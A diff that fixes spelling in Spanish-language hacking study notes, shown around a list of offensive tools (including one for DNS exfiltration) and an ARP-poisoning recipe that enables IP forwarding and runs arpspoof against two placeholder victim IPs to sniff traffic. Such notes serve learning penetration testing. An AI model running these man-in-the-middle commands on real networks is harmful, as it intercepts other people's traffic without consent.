@@ -77,9 +77,9 @@ Estas son las notas que he ido cogiendo desde que empecé a aprender sobre hacki
 - [**PacketWhisper**](https://github.com/TryCatchHCF/PacketWhisper)**:** Para exfiltrar información usando DNS
 - [**Updog**](https://github.com/sc0tfree/updog)**:** Alternativa al `SimpleHTTPServer` de Python que además permite también subir archivos
 - [**Olevba**](https://github.com/decalage2/oletools/wiki/olevba)**:** Script para buscar macros en documentos office
-- En redes con switches necesitaremos hace ARP poisoning para poder hace sniff de paquetes (Man in the middle):
+- En redes con switches necesitaremos hacer ARP poisoning para poder hace sniff de paquetes (Man in the middle):
 ```console
-echo 1 > /proc/sys/net/ipv4/ip_forward # Activa la redirección de paquetes en el kernel de Linux para evitar problemas de comunicación entre las victimas
+echo 1 > /proc/sys/net/ipv4/ip_forward # Activa la redirección de paquetes en el kernel de Linux para evitar problemas de comunicación entre las víctimas
 arpspoof -i eht0 -t <VICTIM_IP_A> -r <VICTIM_IP_B>
 ```
 
